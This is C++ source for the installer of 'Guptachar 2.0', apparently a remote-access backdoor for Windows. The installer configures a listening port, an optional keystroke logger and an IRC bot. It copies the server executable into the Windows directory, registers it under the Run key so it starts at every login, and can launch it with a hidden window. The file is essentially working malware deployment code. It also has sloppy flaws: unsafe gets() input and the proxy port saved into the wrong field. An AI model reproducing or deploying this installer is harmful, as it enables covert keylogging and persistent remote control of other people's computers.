/*
    Guptachar Installer
    Copyright (C) 2002 Ayan Chakrabarti

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

    install.cpp
    ===========

    The Guptachar Installer
*/

#include <stdio.h>
#include <conio.h>
#include <windows.h>


struct _options
{
        unsigned int guptport;  // Server Option

        char user[128];         // Authentication Options
        char pass[128];
        char auth[1024];
        char ifuseauth;

        unsigned int seq;      // KeyLogging Options
        char keylog;

        char ifirc;            // IRC Options
        char nick[1024];
        char host[1024];
        unsigned int port;
        char ifuseproxy;
        char proxy[1024];
        unsigned int pport;

} options;


void conv_base64(char * input,char * output)
{
        int len,n,i,j = 0;
        char c1,c2,c3,o1,o2,o3,o4;
        char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


        len = strlen(input);
        n = len/3;

        for(i = 0;i < n;i++)
        {
             c1 = input[i*3];
             c2 = input[i*3+1];
             c3 = input[i*3+2];

             o1 = (c1 >> 2) & 0x3F;
             
             o2 = c1 & 0x03;
             o2 <<= 4;
             o2 &= 0xF0;
             c1 = c2 >> 4;
             c1 &= 0x0F;
             o2 += c1;

             o3 = c2 & 0x0F;
             o3 <<= 2;
             o3 &= 0xFC;
             c2 = c3 >> 6;
             c2 &= 0x03;
             o3 += c2;

             o4 = c3 & 0x3F;

             output[j++] = table[o1];
             output[j++] = table[o2];
             output[j++] = table[o3];
             output[j++] = table[o4];
        }

        if(len % 3 == 0)
        {
                output[j] = '\0';
                return;
        }

        if(len % 3 == 1)
        {
                c1 = input[len-1];
                c2 = 0;
        }

        if(len %3 == 2)
        {
                c1 = input[len-2];
                c2 = input[len-1];
        }

        c3 = 0;

        o1 = (c1 >> 2) & 0x3F;
             
        o2 = c1 & 0x03;
        o2 <<= 4;
        o2 &= 0xF0;
        c1 = c2 >> 4;
        c1 &= 0x0F;
        o2 += c1;
                         
        o3 = c2 & 0x0F;
        o3 <<= 2;
        o3 &= 0xFC;
        c2 = c3 >> 6;
        c2 &= 0x03;
        o3 += c2;

        o4 = c3 & 0x3F;

        output[j++] = table[o1];
        output[j++] = table[o2];
        output[j++] = table[o3];
        output[j++] = table[o4];

        output[j] = '\0';

        for(i = 0;i < (3 - len%3);i++)
                output[--j] = '=';
}

void getoptname(char * fname)
{
        GetWindowsDirectory(fname,1000);
        if(fname[strlen(fname)-1] != '\\')
                strcat(fname,"\\");
        strcat(fname,"GPTCR.NFO");

}

void saveopts()
{
        FILE * fp;
        char fname[1024];

        getoptname(fname);
        fp = fopen(fname,"wt");
        if(!fp)
                return;
        fwrite((char *) &options, sizeof(options), 1, fp);
        fclose(fp);
}

int getchoice()
{
        char buf[1024];

        gets(buf);

        return (buf[0] == 'y' || buf[0] == 'Y');
}

unsigned int getnum()
{
        char buf[1024];
        unsigned int retval = 0;
        int i;

        gets(buf);

        for(i = 0;buf[i];i++)
                retval = retval*10 + buf[i] - '0';

        return retval;
}


int main()
{
        int ch;
        FILE *fp1,*fp2;
        char fn[1024];

        clrscr();

        printf("Guptachar 2.0\n");
        printf("Copyright (C) 2001 Ayan Chakrabarti\n\n");

        printf("This program is free software; you can redistribute it and/or modify\n");
        printf("it under the terms of the GNU General Public License as published by\n");
        printf("the Free Software Foundation; either version 2 of the License, or\n");
        printf("(at your option) any later version.\n\n");

        printf("This program is distributed in the hope that it will be useful,\n");
        printf("but WITHOUT ANY WARRANTY; without even the implied warranty of\n");
        printf("MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n");
        printf("GNU General Public License for more details.\n\n");

        printf("You should have received a copy of the GNU General Public License\n");
        printf("along with this program; if not, write to the Free Software\n");
        printf("Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.\n\n");

        printf("Installation Program\n");
        printf("--------------------\n\n");

        printf("Ideally you should read the REAMDE.HTML file before going on.\n\n");

        printf("Do you want to install Guptachar on this system ? (y/n): ");

        if(!getchoice())
                return 0;

        do {
                printf("What port do you want Guptachar to listen on (Suggested 8081):");
                options.guptport = getnum();
        } while(options.guptport == 0);



        printf("Do you want users to be authenticated before accessing the server ?[Yes/No] ");
        if(getchoice())
        {
                options.ifuseauth = 1;
                printf("Enter username: ");
                gets(options.user);
                printf("Enter password: ");
                gets(options.pass);

                char auth[1024];
                strcpy(auth,options.user);
                strcat(auth,":");
                strcat(auth,options.pass);

                conv_base64(auth,options.auth);
        }
        else
        {
                options.ifuseauth = 0;
                options.user[0] = '\0';
                options.pass[0] = '\0';
                options.auth[0] = '\0';
        }

        printf("Do you want Guptachar to log keys ? [Yes/No] ");
        if(getchoice())
                options.keylog = 1;
        else
                options.keylog = 0;


        printf("Do you want the IRC bot to be active ? [Yes/No] ");
        if(getchoice())
        {
                options.ifirc = 1;
                printf("Enter Nickname:");
                gets(options.nick);
                printf("Enter IRC Server (like irc.gimp.net): ");
                gets(options.host);
                do
                {
                        printf("Enter IRC Port (usually 6667): ");
                        options.port = getnum();
                } while(options.port == 0);

                printf("Do you want to connect through a proxy (HTTP) ? [Yes/No] ");
                if(getchoice())
                {
                        options.ifuseproxy = 1;
                        printf("Enter Proxy Server: ");
                        gets(options.proxy);
                        do
                        {
                                printf("Enter proxy port: ");
                                options.port = getnum();
                        } while(options.port == 0);
                }
                else
                {
                        options.proxy[0] = '\0';
                        options.ifuseproxy = 0;
                        options.pport = 3128;
                }
        }
        else
        {
                options.ifirc = 0;
                options.nick[0] = '\0';
                options.host[0] = '\0';
                options.proxy[0] = '\0';
                options.ifuseproxy = 0;
                options.port = 6667;
                options.pport = 3128;
        }



        printf("\nInstalling .....\n");

        printf("Copying Executable ...");

        GetWindowsDirectory(fn,1000);
        strcat(fn,"\\GPTCR2.exe");

        fp1 = fopen("Gupt.exe","rb");
        if(!fp1)
        {
                printf("\n\nError: Gupt.exe not found.\n");
                printf("Ensure Gupt.exe is in current directory and try again.\n");
                return -1;
        }
        fp2 = fopen(fn,"wb");
        if(!fp2)
        {
                fclose(fp1);
                printf("\n\nError: Unable to create output file.\n\n");
                return -1;
        }

        ch = fgetc(fp1);
        while(!feof(fp1))
        {
                fputc(ch,fp2);
                ch = fgetc(fp1);
        }
        fclose(fp1);
        fclose(fp2);

        printf("\nSaving options ...");
        saveopts();

        printf("\nChanging registry ...");

        LONG  lResult;
        HKEY  hKeyResult = 0;

        lResult = RegOpenKeyEx( HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKeyResult );

        if ( lResult == ERROR_SUCCESS )
        {
                lResult = RegSetValueEx( hKeyResult, "GPTCR2", 0, REG_SZ,
                                         fn,14);
                RegCloseKey( hKeyResult );   
        }


        printf("\n\nInstallation complete.\n\n");

        printf("Do you want to start the Guptachar server now ? <Yes/No> ");

        if(getchoice())
                WinExec(fn,0);

        return 0;
}
